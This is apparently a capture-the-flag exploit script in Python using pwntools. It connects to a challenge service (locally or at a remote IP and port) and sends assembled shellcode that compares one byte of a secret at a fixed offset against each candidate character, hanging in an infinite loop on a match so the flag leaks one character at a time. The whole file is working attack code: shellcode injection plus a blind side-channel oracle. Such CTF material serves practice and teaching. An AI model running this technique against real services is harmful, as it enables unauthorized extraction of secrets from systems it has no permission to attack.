#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *
import string

debug = 0
context(log_level="debug", arch="amd64", os="linux")

num = 31
strstr = string.lowercase + '_{}' + string.digits + string.uppercase
for j in strstr:
    if debug == 1:
        p = process('./chall')
    else:
        p = remote('121.36.64.245', 10003)
    # gdb.attach(p, "b *$reabse(0xD82)\nc")
    pd = asm('''
             mov rdi, [rsp + 0x18]
             movzx eax, byte ptr[rdi + {}]
             cmp al, {}
             jnz exit
             while:
                 jmp while
             exit:
             '''.format(str(num), ord(j)))
    # info(hex(len(pd)))
    success(str(num) + ' = ' + j)
    p.sendlineafter('Your Shellcode >>', pd)
    p.interactive()
    p.close()
